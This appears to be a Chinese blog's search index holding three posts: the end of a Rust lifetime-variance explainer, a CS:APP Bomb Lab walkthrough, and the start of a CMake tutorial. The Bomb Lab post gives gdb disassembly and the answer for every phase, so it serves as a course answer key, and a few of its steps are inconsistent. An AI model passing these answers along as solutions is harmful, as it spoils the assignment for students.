'b，即'a表示的生命周期大于等于'b，也代表着'a &lt;: 'b。乍一看有点反直觉，但也很好理解。'a:'b代表'a至少和'b一样长，即'a比'b更加特化，就像Cat至少是种Animal，Cat更加特化。'static关键字代表静态生命周期，在程序的整个生命周期中持续存在，所以'static是任意生命周期'a的子类型。 我们经常会感叹于 Rust 编译器的智能，能准确推断出程序中某个引用的生命周期不够长、不匹配。这同时也是子类型和变形的功劳。根据上文讨论的结论，Rust 生命周期的子类型有如下变形规则： ‘a T U * &amp;'a T covariant covariant * &amp;'a mut T covariant invariant * Box&lt;T&gt; covariant Vec&lt;T&gt; covariant * UnsafeCell&lt;T&gt; invariant Cell&lt;T&gt; invariant * fn(T) -&gt; U contravariant covariant *const T covariant *mut T invariant 我们看如下这个例子： 12345678910111213fn evil_feeder&lt;T&gt;(input: &amp;mut T, val: T) { *input = val;}fn main() { let mut mr_snuggles: &amp;'static str = &quot;meow! :3&quot;; // mr. snuggles forever!! { let spike = String::from(&quot;bark! &gt;:V&quot;); let spike_str: &amp;str = &amp;spike; // Only lives for the block evil_feeder(&amp;mut mr_snuggles, spike_str); // EVIL! } println!(&quot;{}&quot;, mr_snuggles); // Use after free?} 编译结果： 我们一眼就能看出，spike_str的 lifetime 太短了，不可能复制给mr_snuggles，那么编译器是如何推断的呢？ 因为&amp;mut T是对 T 的 invariant，所以编译器推断 T 必须是&amp;'static str； spike_str是一个&amp;'a str，对'a是 covariant，要匹配 T，必须尝试通过 covariant 变形成'static str； 那么编译器推断出&amp;'a str:'&amp;'static str，也即'a:'static，这当然无法成立，导致编译错误。 此外，再看一个更明显的例子: 123456789101112131415// compile errorfn invariant&lt;'a: 'b, 'b, 'c&gt;( sub: &amp;'c mut Vec&lt;&amp;'a String&gt;, sup: &amp;'c mut Vec&lt;&amp;'b String&gt;,) -&gt; &amp;'c mut Vec&lt;&amp;'b String&gt; { sub}// compile okfn covariant&lt;'a: 'b, 'b, 'c&gt;( sub: &amp;'c Vec&lt;&amp;'a String&gt;, sup: &amp;'c Vec&lt;&amp;'b String&gt;,) -&gt; &amp;'c Vec&lt;&amp;'b String&gt; { sub} build 结果如下： 在两个函数的泛型参数中，显式标注了'a : 'b； 由于&amp;'a T对'a covariant，所以&amp;'a String : &amp;'b String； 由于Vec&lt;T&gt;对T covariant，所以Vec&lt;&amp;'a String&gt; : Vec&lt;&amp;'b String&gt;； 由于&amp;'a T对 T 是 covariant，所以&amp;'c Vec&lt;&amp;'a String&gt; : &amp;'c Vec&lt;&amp;'b String&gt;； 所以在 covariant 函数中，当函数要求返回&amp;'c Vec&lt;&amp;'b String&gt;时，可以直接返回&amp;'c Vec&lt;&amp;'a String&gt;； 但是&amp;'c mut T对 T 是 invariant，&amp;'c mut Vec&lt;&amp;'a String&gt;与``&amp;’c mut Vec&lt;&amp;’b String&gt;`间没有子类型关系，所以在 invariant 函数中无法再这么做。 最后还有一个例子，看看函数的逆变： 12345678910111213141516171819struct ContraVariant&lt;Mixed&gt; { f: fn(Mixed),}fn test&lt;'a&gt;( a: &amp;mut ContraVariant&lt;&amp;'a i32&gt;, b: &amp;mut ContraVariant&lt;&amp;'static i32&gt;, f1: fn(&amp;'a i32), f2: fn(&amp;'static i32),) { a.f = f1; a.f = f2; b.f = f1; b.f = f2;}fn main() {} build 结果如下： 可以看到，四个赋值语句中，只有a.f = f2失败了。 fn(T)对T contravariant，&amp;'static i32 : &amp;'a i32，所以 fn(&amp;'a i32) : fn(&amp;'static i32)； a.f类型为fn(&amp;'a i32)，f2类型为fn(&amp;'static i32)； a.f = f2，相当于把父类型变量赋值给了子类型，类型不匹配，失败了。 资料援引 https://doc.rust-lang.org/nomicon/subtyping.html https://en.wikipedia.org/wiki/Type_constructor https://en.wikipedia.org/wiki/Subtyping https://en.wikipedia.org/wiki/Covariance_and_contravariance_(computer_science) https://zhuanlan.zhihu.com/p/41814387","link":"/2021/04/29/rust-lifetime-variance/"},{"title":"CS:APP Bomb lab","text":"实验步骤准备工作使用tar -vxf将炸弹压缩包解压,cd 进入,可以从 bomb.c 中看出实验的用意以及程序的大致逻辑,bomb 为可执行程序,使用 gdb 调试该程序. 1234(gdb) b read_lineBreakpoint 1 at 0x40155c(gdb) b explode_bombBreakpoint 2 at 0x4014e4 给 read_line 函数打上断点,以便每次输入运行一关.给 explode_bomb 打上断点,以便在炸弹爆炸前可以处理. phase_1获得 phase_1 汇编代码 1234567891011(gdb) disas phase_1Dump of assembler code for function phase_1: 0x0000000000400e80 &lt;+0&gt;: sub $0x8,%rsp 0x0000000000400e84 &lt;+4&gt;: mov $0x4024a0,%esi 0x0000000000400e89 &lt;+9&gt;: callq 0x40127e &lt;strings_not_equal&gt; 0x0000000000400e8e &lt;+14&gt;: test %eax,%eax 0x0000000000400e90 &lt;+16&gt;: je 0x400e97 &lt;phase_1+23&gt; 0x0000000000400e92 &lt;+18&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000400e97 &lt;+23&gt;: add $0x8,%rsp 0x0000000000400e9b &lt;+27&gt;: retqEnd of assembler dump. 可见,此题是将我们输入的字符串与地址 0x4024a0 处字符串比较,不等则爆炸.查看该字符串. 12(gdb) x/s 0x4024a00x4024a0 &lt;__dso_handle+344&gt;: &quot;We have to stand with our North Korean allies.&quot; 那么答案是 We have to stand with our North Korean allies. phase_21234567891011121314151617181920212223242526272829(gdb) disas phase_2Dump of assembler code for function phase_2: 0x0000000000400e9c &lt;+0&gt;: push %rbp 0x0000000000400e9d &lt;+1&gt;: push %rbx 0x0000000000400e9e &lt;+2&gt;: sub $0x28,%rsp 0x0000000000400ea2 &lt;+6&gt;: mov %rsp,%rsi 0x0000000000400ea5 &lt;+9&gt;: callq 0x40151a &lt;read_six_numbers&gt; 0x0000000000400eaa &lt;+14&gt;: cmpl $0x1,(%rsp) 0x0000000000400eae &lt;+18&gt;: je 0x400ed0 &lt;phase_2+52&gt; 0x0000000000400eb0 &lt;+20&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000400eb5 &lt;+25&gt;: jmp 0x400ed0 &lt;phase_2+52&gt; 0x0000000000400eb7 &lt;+27&gt;: mov -0x4(%rbx),%eax 0x0000000000400eba &lt;+30&gt;: add %eax,%eax 0x0000000000400ebc &lt;+32&gt;: cmp %eax,(%rbx) 0x0000000000400ebe &lt;+34&gt;: je 0x400ec5 &lt;phase_2+41&gt; 0x0000000000400ec0 &lt;+36&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000400ec5 &lt;+41&gt;: add $0x4,%rbx 0x0000000000400ec9 &lt;+45&gt;: cmp %rbp,%rbx 0x0000000000400ecc &lt;+48&gt;: jne 0x400eb7 &lt;phase_2+27&gt; 0x0000000000400ece &lt;+50&gt;: jmp 0x400edc &lt;phase_2+64&gt; 0x0000000000400ed0 &lt;+52&gt;: lea 0x4(%rsp),%rbx 0x0000000000400ed5 &lt;+57&gt;: lea 0x18(%rsp),%rbp 0x0000000000400eda &lt;+62&gt;: jmp 0x400eb7 &lt;phase_2+27&gt; 0x0000000000400edc &lt;+64&gt;: add $0x28,%rsp---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 0x0000000000400ee0 &lt;+68&gt;: pop %rbx 0x0000000000400ee1 &lt;+69&gt;: pop %rbp 0x0000000000400ee2 &lt;+70&gt;: retqEnd of assembler dump. +3 处发现在栈中开辟了 0x28 的内存区域.然后将%rsp 的值传给%rsi 作为参数传给函数 read_six_numbers,可以看出应该使用开辟的空闲内存做数组,记数组为 r,读取六个数字.将(%rsp)和 0x1 比较,如果不等,就会爆炸,(％rsp)为数组首元,故 r[0]＝１;跳转到+52,将 r[1]地址赋给%rbx,将 r6地址赋给%rbp,跳到+27,将%eax 设为%rbx 指向的前一个数,此时为 r[0],比较 r[1]和 2*r[0]是否相等,不等则爆炸.跳转到+41,％rbx+4,比较%rbx 和%rbp,不等跳转到+27,重复,等则跳转到+64 结束,成功.可以看出，这是一个循环比较.等价于下面的 c 语 a 言 1234for(int *b = &amp;r[1]; b != &amp;r[6]; b++){ if(*b != 2 * (*(b - 1))) call explode_bomb; 故答案应该为 1 2 4 8 16 32. phase_312340x0000000000400ef1 &lt;+14&gt;: mov $0x4027cd,%esi0x0000000000400ef6 &lt;+19&gt;: mov $0x0,%eax0x0000000000400efb &lt;+24&gt;: callq 0x400ba0 &lt;__isoc99_sscanf@plt&gt;0x0000000000400f00 &lt;+29&gt;: cmp $0x1,%eax 查看 0x4027cd, 12(gdb) x/s 0x4027cd0x4027cd: &quot;%d %d&quot; 可知,应该是读入了两个整数. 1234567891011121314151617181920212223242526272829303132 0x0000000000400f15 &lt;+50&gt;: jmpq *0x402500(,%rax,8) 0x0000000000400f1c &lt;+57&gt;: mov $0x0,%eax 0x0000000000400f21 &lt;+62&gt;: jmp 0x400f28 &lt;phase_3+69&gt; 0x0000000000400f23 &lt;+64&gt;: mov $0x19c,%eax 0x0000000000400f28 &lt;+69&gt;: sub $0xcd,%eax 0x0000000000400f2d &lt;+74&gt;: jmp 0x400f34 &lt;phase_3+81&gt; 0x0000000000400f2f &lt;+76&gt;: mov $0x0,%eax 0x0000000000400f34 &lt;+81&gt;: add $0x29b,%eax 0x0000000000400f39 &lt;+86&gt;: jmp 0x400f40 &lt;phase_3+93&gt; 0x0000000000400f3b &lt;+88&gt;: mov $0x0,%eax---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 0x0000000000400f40 &lt;+93&gt;: sub $0x36f,%eax 0x0000000000400f45 &lt;+98&gt;: jmp 0x400f4c &lt;phase_3+105&gt; 0x0000000000400f47 &lt;+100&gt;: mov $0x0,%eax 0x0000000000400f4c &lt;+105&gt;: add $0x36f,%eax 0x0000000000400f51 &lt;+110&gt;: jmp 0x400f58 &lt;phase_3+117&gt; 0x0000000000400f53 &lt;+112&gt;: mov $0x0,%eax 0x0000000000400f58 &lt;+117&gt;: sub $0x36f,%eax 0x0000000000400f5d &lt;+122&gt;: jmp 0x400f64 &lt;phase_3+129&gt; 0x0000000000400f5f &lt;+124&gt;: mov $0x0,%eax 0x0000000000400f64 &lt;+129&gt;: add $0x36f,%eax 0x0000000000400f69 &lt;+134&gt;: jmp 0x400f70 &lt;phase_3+141&gt; 0x0000000000400f6b &lt;+136&gt;: mov $0x0,%eax 0x0000000000400f70 &lt;+141&gt;: sub $0x36f,%eax 0x0000000000400f75 &lt;+146&gt;: jmp 0x400f81 &lt;phase_3+158&gt; 0x0000000000400f77 &lt;+148&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000400f7c &lt;+153&gt;: mov $0x0,%eax 0x0000000000400f81 &lt;+158&gt;: cmpl $0x5,0xc(%rsp) 0x0000000000400f86 &lt;+163&gt;: jg 0x400f8e &lt;phase_3+171&gt; 0x0000000000400f88 &lt;+165&gt;: cmp 0x8(%rsp),%eax 0x0000000000400f8c &lt;+169&gt;: je 0x400f93 &lt;phase_3+176&gt; 0x0000000000400f8e &lt;+171&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 由这段汇编代码可知,这是一段 switch 语句,使用输入的第一个值作为 key,经过对应跳转位置的操作后应与第二个数相等. 12(gdb) p/x *（0x402500 + 32）$1 = 0x400f47 那么第一个数为 0 时,跳转到 0x400f23 处,那么第二个数应该为此处的 0x0,故一组答案为 4 0; phase_4123456789101112131415161718192021222324(gdb) disas phase_4Dump of assembler code for function phase_4: 0x0000000000400fd0 &lt;+0&gt;: sub $0x18,%rsp 0x0000000000400fd4 &lt;+4&gt;: lea 0xc(%rsp),%rcx 0x0000000000400fd9 &lt;+9&gt;: lea 0x8(%rsp),%rdx 0x0000000000400fde &lt;+14&gt;: mov $0x4027cd,%esi 0x0000000000400fe3 &lt;+19&gt;: mov $0x0,%eax 0x0000000000400fe8 &lt;+24&gt;: callq 0x400ba0 &lt;__isoc99_sscanf@plt&gt; 0x0000000000400fed &lt;+29&gt;: cmp $0x2,%eax 0x0000000000400ff0 &lt;+32&gt;: jne 0x400ffe &lt;phase_4+46&gt; 0x0000000000400ff2 &lt;+34&gt;: mov 0xc(%rsp),%eax 0x0000000000400ff6 &lt;+38&gt;: sub $0x2,%eax 0x0000000000400ff9 &lt;+41&gt;: cmp $0x2,%eax 0x0000000000400ffc &lt;+44&gt;: jbe 0x401003 &lt;phase_4+51&gt; 0x0000000000400ffe &lt;+46&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000401003 &lt;+51&gt;: mov 0xc(%rsp),%esi 0x0000000000401007 &lt;+55&gt;: mov $0x9,%edi 0x000000000040100c &lt;+60&gt;: callq 0x400f98 &lt;func4&gt; 0x0000000000401011 &lt;+65&gt;: cmp 0x8(%rsp),%eax 0x0000000000401015 &lt;+69&gt;: je 0x40101c &lt;phase_4+76&gt; 0x0000000000401017 &lt;+71&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x000000000040101c &lt;+76&gt;: add $0x18,%rsp 0x0000000000401020 &lt;+80&gt;: retqEnd of assembler dump. 由代码易知,phase_4 读入了两个数,第二个数在 2-4 之间,然后将第二个数作为func4 的第二个参数,func4 第一个参数为 9,输入的第一个数必须和 func4 返回值相等. 1234567891011121314151617181920212223242526(gdb) disas func4Dump of assembler code for function func4: 0x0000000000400f98 &lt;+0&gt;: push %r12 0x0000000000400f9a &lt;+2&gt;: push %rbp 0x0000000000400f9b &lt;+3&gt;: push %rbx 0x0000000000400f9c &lt;+4&gt;: mov %edi,%ebx 0x0000000000400f9e &lt;+6&gt;: test %edi,%edi 0x0000000000400fa0 &lt;+8&gt;: jle 0x400fc6 &lt;func4+46&gt; 0x0000000000400fa2 &lt;+10&gt;: mov %esi,%ebp 0x0000000000400fa4 &lt;+12&gt;: mov %esi,%eax 0x0000000000400fa6 &lt;+14&gt;: cmp $0x1,%edi 0x0000000000400fa9 &lt;+17&gt;: je 0x400fcb &lt;func4+51&gt; 0x0000000000400fab &lt;+19&gt;: lea -0x1(%rdi),%edi 0x0000000000400fae &lt;+22&gt;: callq 0x400f98 &lt;func4&gt; 0x0000000000400fb3 &lt;+27&gt;: lea (%rax,%rbp,1),%r12d 0x0000000000400fb7 &lt;+31&gt;: lea -0x2(%rbx),%edi 0x0000000000400fba &lt;+34&gt;: mov %ebp,%esi 0x0000000000400fbc &lt;+36&gt;: callq 0x400f98 &lt;func4&gt; 0x0000000000400fc1 &lt;+41&gt;: add %r12d,%eax 0x0000000000400fc4 &lt;+44&gt;: jmp 0x400fcb &lt;func4+51&gt; 0x0000000000400fc6 &lt;+46&gt;: mov $0x0,%eax 0x0000000000400fcb &lt;+51&gt;: pop %rbx 0x0000000000400fcc &lt;+52&gt;: pop %rbp 0x0000000000400fcd &lt;+53&gt;: pop %r12 0x0000000000400fcf &lt;+55&gt;: retqEnd of assembler dump. 此函数等价于下面的 c 代码 12345678910int func4(int a, int b){ if(a &lt;= 0) return 0; if(a == 1) return b; return b + func4(a - 1, b) + func4(n - 2, b);} 穷举 2-4 的值即可得到答案,取答案为 176 2 phase_512345678910111213141516171819202122(gdb) disas phase_5Dump of assembler code for function phase_5: 0x0000000000401021 &lt;+0&gt;: push %rbx 0x0000000000401022 &lt;+1&gt;: mov %rdi,%rbx 0x0000000000401025 &lt;+4&gt;: callq 0x401261 &lt;string_length&gt; 0x000000000040102a &lt;+9&gt;: cmp $0x6,%eax 0x000000000040102d &lt;+12&gt;: je 0x401034 &lt;phase_5+19&gt; 0x000000000040102f &lt;+14&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000401034 &lt;+19&gt;: mov $0x0,%eax 0x0000000000401039 &lt;+24&gt;: mov $0x0,%edx 0x000000000040103e &lt;+29&gt;: movzbl (%rbx,%rax,1),%ecx 0x0000000000401042 &lt;+33&gt;: and $0xf,%ecx 0x0000000000401045 &lt;+36&gt;: add 0x402540(,%rcx,4),%edx 0x000000000040104c &lt;+43&gt;: add $0x1,%rax 0x0000000000401050 &lt;+47&gt;: cmp $0x6,%rax 0x0000000000401054 &lt;+51&gt;: jne 0x40103e &lt;phase_5+29&gt; 0x0000000000401056 &lt;+53&gt;: cmp $0x27,%edx 0x0000000000401059 &lt;+56&gt;: je 0x401060 &lt;phase_5+63&gt; 0x000000000040105b &lt;+58&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000401060 &lt;+63&gt;: pop %rbx 0x0000000000401061 &lt;+64&gt;: retqEnd of assembler dump. 由汇编代码可知,需要输入一个长度为 6 的字符串.令该字符串为 input,+36 处出现的数组为 array,则该汇编等价于下面代码. 12for(int i = 0; i &lt; 6; i++) sum += array[ input[i] &amp; 0xf ]; 意为遍历输入字符串,取该字符串低 4 位作为 array 下标,取出 array 值相加.查看 array 的值 123(gdb) p/x *0x402540@16$2 = {0x2, 0xa, 0x6, 0x1, 0xc, 0x10, 0x9, 0x3, 0x4, 0x7, 0xe, 0x5, 0xb, 0x8, 0xf, 0xd} 题目要求 sum = 0x27,故从 array 中选出 6 个和为 0x27 的数,通过这 6 个数的下标找出对应字符.答案应为 01347L; phase_6因为课程未对后续两关作要求,故不做特别详细的解答. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980(gdb) disas phase_6Dump of assembler code for function phase_6: 0x0000000000401062 &lt;+0&gt;: push %r13 0x0000000000401064 &lt;+2&gt;: push %r12 0x0000000000401066 &lt;+4&gt;: push %rbp 0x0000000000401067 &lt;+5&gt;: push %rbx 0x0000000000401068 &lt;+6&gt;: sub $0x58,%rsp 0x000000000040106c &lt;+10&gt;: lea 0x30(%rsp),%rsi 0x0000000000401071 &lt;+15&gt;: callq 0x40151a &lt;read_six_numbers&gt; 0x0000000000401076 &lt;+20&gt;: lea 0x30(%rsp),%r13 0x000000000040107b &lt;+25&gt;: mov $0x0,%r12d 0x0000000000401081 &lt;+31&gt;: mov %r13,%rbp 0x0000000000401084 &lt;+34&gt;: mov 0x0(%r13),%eax 0x0000000000401088 &lt;+38&gt;: sub $0x1,%eax 0x000000000040108b &lt;+41&gt;: cmp $0x5,%eax 0x000000000040108e &lt;+44&gt;: jbe 0x401095 &lt;phase_6+51&gt; 0x0000000000401090 &lt;+46&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000401095 &lt;+51&gt;: add $0x1,%r12d 0x0000000000401099 &lt;+55&gt;: cmp $0x6,%r12d 0x000000000040109d &lt;+59&gt;: jne 0x4010a6 &lt;phase_6+68&gt; 0x000000000040109f &lt;+61&gt;: mov $0x0,%esi 0x00000000004010a4 &lt;+66&gt;: jmp 0x4010e8 &lt;phase_6+134&gt; 0x00000000004010a6 &lt;+68&gt;: mov %r12d,%ebx 0x00000000004010a9 &lt;+71&gt;: movslq %ebx,%rax---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 0x00000000004010ac &lt;+74&gt;: mov 0x30(%rsp,%rax,4),%eax 0x00000000004010b0 &lt;+78&gt;: cmp %eax,0x0(%rbp) 0x00000000004010b3 &lt;+81&gt;: jne 0x4010ba &lt;phase_6+88&gt; 0x00000000004010b5 &lt;+83&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x00000000004010ba &lt;+88&gt;: add $0x1,%ebx 0x00000000004010bd &lt;+91&gt;: cmp $0x5,%ebx 0x00000000004010c0 &lt;+94&gt;: jle 0x4010a9 &lt;phase_6+71&gt; 0x00000000004010c2 &lt;+96&gt;: add $0x4,%r13 0x00000000004010c6 &lt;+100&gt;: jmp 0x401081 &lt;phase_6+31&gt; 0x00000000004010c8 &lt;+102&gt;: mov 0x8(%rdx),%rdx 0x00000000004010cc &lt;+106&gt;: add $0x1,%eax 0x00000000004010cf &lt;+109&gt;: cmp %ecx,%eax 0x00000000004010d1 &lt;+111&gt;: jne 0x4010c8 &lt;phase_6+102&gt; 0x00000000004010d3 &lt;+113&gt;: jmp 0x4010da &lt;phase_6+120&gt; 0x00000000004010d5 &lt;+115&gt;: mov $0x603410,%edx 0x00000000004010da &lt;+120&gt;: mov %rdx,(%rsp,%rsi,2) 0x00000000004010de &lt;+124&gt;: add $0x4,%rsi 0x00000000004010e2 &lt;+128&gt;: cmp $0x18,%rsi 0x00000000004010e6 &lt;+132&gt;: je 0x4010fd &lt;phase_6+155&gt; 0x00000000004010e8 &lt;+134&gt;: mov 0x30(%rsp,%rsi,1),%ecx 0x00000000004010ec &lt;+138&gt;: cmp $0x1,%ecx 0x00000000004010ef &lt;+141&gt;: jle 0x4010d5 &lt;phase_6+115&gt; 0x00000000004010f1 &lt;+143&gt;: mov $0x1,%eax---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 0x00000000004010f6 &lt;+148&gt;: mov $0x603410,%edx 0x00000000004010fb &lt;+153&gt;: jmp 0x4010c8 &lt;phase_6+102&gt; 0x00000000004010fd &lt;+155&gt;: mov (%rsp),%rbx 0x0000000000401101 &lt;+159&gt;: lea 0x8(%rsp),%rax 0x0000000000401106 &lt;+164&gt;: lea 0x30(%rsp),%rsi 0x000000000040110b &lt;+169&gt;: mov %rbx,%rcx 0x000000000040110e &lt;+172&gt;: mov (%rax),%rdx 0x0000000000401111 &lt;+175&gt;: mov %rdx,0x8(%rcx) 0x0000000000401115 &lt;+179&gt;: add $0x8,%rax 0x0000000000401119 &lt;+183&gt;: cmp %rsi,%rax 0x000000000040111c &lt;+186&gt;: je 0x401123 &lt;phase_6+193&gt; 0x000000000040111e &lt;+188&gt;: mov %rdx,%rcx 0x0000000000401121 &lt;+191&gt;: jmp 0x40110e &lt;phase_6+172&gt; 0x0000000000401123 &lt;+193&gt;: movq $0x0,0x8(%rdx) 0x000000000040112b &lt;+201&gt;: mov $0x5,%ebp 0x0000000000401130 &lt;+206&gt;: mov 0x8(%rbx),%rax 0x0000000000401134 &lt;+210&gt;: mov (%rax),%eax 0x0000000000401136 &lt;+212&gt;: cmp %eax,(%rbx) 0x0000000000401138 &lt;+214&gt;: jge 0x40113f &lt;phase_6+221&gt; 0x000000000040113a &lt;+216&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x000000000040113f &lt;+221&gt;: mov 0x8(%rbx),%rbx 0x0000000000401143 &lt;+225&gt;: sub $0x1,%ebp 0x0000000000401146 &lt;+228&gt;: jne 0x401130 &lt;phase_6+206&gt;---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 0x0000000000401148 &lt;+230&gt;: add $0x58,%rsp 0x000000000040114c &lt;+234&gt;: pop %rbx 0x000000000040114d &lt;+235&gt;: pop %rbp 0x000000000040114e &lt;+236&gt;: pop %r12 0x0000000000401150 &lt;+238&gt;: pop %r13 0x0000000000401152 &lt;+240&gt;: retqEnd of assembler dump. 汇编代码很长.其意为输入 6 个互不相等的数,介于 1-6.按这 6 个数的值从位于地址 0x603410 的链表中选出对应位置的节点指针,组成一个数组.按选出的顺序将这六个节点组成新的链表,然后检查这个链表是否为降序.查看链表的值. 12345678910111213141516171819202122(gdb) p/x *(0x603410)$3 = 0x1cf(gdb) p/x *(0x603410 + 8)$4 = 0x603420(gdb) p/x *(0x603420)$5 = 0x188(gdb) p/x *(0x603420 + 8)$6 = 0x603430(gdb) p/x *(0x603430)$7 = 0x1d1(gdb) p/x *(0x603430 + 8)$8 = 0x603440(gdb) p/x *(0x603440)$9 = 0x174(gdb) p/x *(0x603440 + 8)$10 = 0x603450(gdb) p/x *(0x603450)$11 = 0x220(gdb) p/x *(0x603450 + 8)$12 = 0x603460(gdb) p/x *(0x603460 + 8)$13 = 0x0 故答案应为 6 5 3 1 2 4; secret_phase正常通过前 6 关是无法触发 secret_phase 的,查看汇编发现,在 phase_4 答案之后输入 DrEvil 即可进入 secret_phase. 1234567891011121314151617181920212223242526(gdb) disas secret_phaseDump of assembler code for function secret_phase: 0x0000000000401191 &lt;+0&gt;: push %rbx 0x0000000000401192 &lt;+1&gt;: callq 0x40155c &lt;read_line&gt; 0x0000000000401197 &lt;+6&gt;: mov $0xa,%edx 0x000000000040119c &lt;+11&gt;: mov $0x0,%esi 0x00000000004011a1 &lt;+16&gt;: mov %rax,%rdi 0x00000000004011a4 &lt;+19&gt;: callq 0x400b80 &lt;strtol@plt&gt; 0x00000000004011a9 &lt;+24&gt;: mov %rax,%rbx 0x00000000004011ac &lt;+27&gt;: lea -0x1(%rax),%eax 0x00000000004011af &lt;+30&gt;: cmp $0x3e8,%eax 0x00000000004011b4 &lt;+35&gt;: jbe 0x4011bb &lt;secret_phase+42&gt; 0x00000000004011b6 &lt;+37&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x00000000004011bb &lt;+42&gt;: mov %ebx,%esi 0x00000000004011bd &lt;+44&gt;: mov $0x603230,%edi 0x00000000004011c2 &lt;+49&gt;: callq 0x401153 &lt;fun7&gt; 0x00000000004011c7 &lt;+54&gt;: cmp $0x4,%eax 0x00000000004011ca &lt;+57&gt;: je 0x4011d1 &lt;secret_phase+64&gt; 0x00000000004011cc &lt;+59&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x00000000004011d1 &lt;+64&gt;: mov $0x4024d0,%edi 0x00000000004011d6 &lt;+69&gt;: callq 0x400ac0 &lt;puts@plt&gt; 0x00000000004011db &lt;+74&gt;: callq 0x401682 &lt;phase_defused&gt; 0x00000000004011e0 &lt;+79&gt;: pop %rbx 0x00000000004011e1 &lt;+80&gt;: retq---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---End of assembler dump. 1234567891011121314151617181920212223(gdb) disas fun7Dump of assembler code for function fun7: 0x0000000000401153 &lt;+0&gt;: sub $0x8,%rsp 0x0000000000401157 &lt;+4&gt;: test %rdi,%rdi 0x000000000040115a &lt;+7&gt;: je 0x401187 &lt;fun7+52&gt; 0x000000000040115c &lt;+9&gt;: mov (%rdi),%edx 0x000000000040115e &lt;+11&gt;: cmp %esi,%edx 0x0000000000401160 &lt;+13&gt;: jle 0x40116f &lt;fun7+28&gt; 0x0000000000401162 &lt;+15&gt;: mov 0x8(%rdi),%rdi 0x0000000000401166 &lt;+19&gt;: callq 0x401153 &lt;fun7&gt; 0x000000000040116b &lt;+24&gt;: add %eax,%eax 0x000000000040116d &lt;+26&gt;: jmp 0x40118c &lt;fun7+57&gt; 0x000000000040116f &lt;+28&gt;: mov $0x0,%eax 0x0000000000401174 &lt;+33&gt;: cmp %esi,%edx 0x0000000000401176 &lt;+35&gt;: je 0x40118c &lt;fun7+57&gt; 0x0000000000401178 &lt;+37&gt;: mov 0x10(%rdi),%rdi 0x000000000040117c &lt;+41&gt;: callq 0x401153 &lt;fun7&gt; 0x0000000000401181 &lt;+46&gt;: lea 0x1(%rax,%rax,1),%eax 0x0000000000401185 &lt;+50&gt;: jmp 0x40118c &lt;fun7+57&gt; 0x0000000000401187 &lt;+52&gt;: mov $0xffffffff,%eax 0x000000000040118c &lt;+57&gt;: add $0x8,%rsp 0x0000000000401190 &lt;+61&gt;: retqEnd of assembler dump. 此题题意为在一个题目中构建好的平衡二叉树中从根节点开始查找一个输入的数.由节点向左为 0,由节点向右为 1,查找路径序的 0-1 列从右向左构成一个二进制数,该二进制数的十进制值必须等于题目中提供的数,其为 4,那么所需查找路径序列为 100,根据二叉树结构,应该查找 7,故答案为 7. 运行截图","link":"/2018/12/01/CSAPP-Bomb-lab/"},{"title":"CMake Tutorial","text":"最近因为毕设的原因，需要看 Cpp 项目，首先项目构建就涉及到了 CMake，所以跟着 CMake 官网的 Tutorial 学习了一下，该文章算是官网教程的搬运。Tutorial 点这里, GitHub 代码点这里. 构建简单项目最基本的 CMake 项目是由源代码文件构建可执行文件。对于简单的项目，只需要一个三行的 CMakeLists.txt 文件。这将是我们 tutorial 的起点。 开始项目1234567cmake_minimum_required(VERSION 3.10)# set the project nameproject(Tutorial)# add the executableadd_executable(Tutorial tutorial.cxx) 源代码tutorial.cxx如下 1234567891011121314151617181920212223// A simple program that computes the square root of a number#include &lt;cmath&gt;#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main(int argc, char* argv[]){ if (argc &lt; 2) { std::cout &lt;&lt; &quot;Usage: &quot; &lt;&lt; argv[0] &lt;&lt; &quot; number&quot; &lt;&lt; std::endl; return 1; } // convert input to double const double inputValue = atof(argv[1]); // calculate square root const double outputValue = sqrt(inputValue); std::cout &lt;&lt; &quot;The square root of &quot; &lt;&lt; inputValue &lt;&lt; &quot; is &quot; &lt;&lt; outputValue &lt;&lt; std::endl; return 0;} 添加版本号并配置头文件添加版本号 12#set the project name and versionproject(Tutorial VERSION 1.0) 然后，配置一个头文件，将版本号传递给源代码 1configure_file(TutorialConfig.h.in TutorialConfig.h) 由于配置的文件将被写入二叉树，所以我们必须将该目录添加到搜索 include 文件的路径列表中（该声明放在add_executable之后）: 123target_include_directories(Tutorial PUBLIC &quot;${PROJECT_BINARY_DIR}&quot; ) 新建TutorialConfig.h.in 123// the configured options and settings for Tutorial#define Tutorial_VERSION_MAJOR @Tutorial_VERSION_MAJOR@#define Tutorial_VERSION_MINOR @Tutorial_VERSION_MINOR@ 当 CMake 配置这个头文件时，@Tutorial_VERSION_MAJOR@和@Tutorial_VERSION_MINOR@的值将被替换。 接着，修改源代码，include 头文件TutorialConfig.h。然后，更新源代码打印出可执行文件的名称和版本号： 1234567if (argc &lt; 2) { // report version std::cout &lt;&lt; argv[0] &lt;&lt; &quot; Version &quot; &lt;&lt; Tutorial_VERSION_MAJOR &lt;&lt; &quot;.&quot; &lt;&lt; Tutorial_VERSION_MINOR &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Usage: &quot; &lt;&lt; argv[0] &lt;&lt; &quot; number&quot; &lt;&lt; std::endl; return 1; } 指定使用 C++11 标准，使用std::stod 12345678cmake_minimum_required(VERSION 3.10)# set the project name and versionproject(Tutorial VERSION 1.0)# specify the C++ 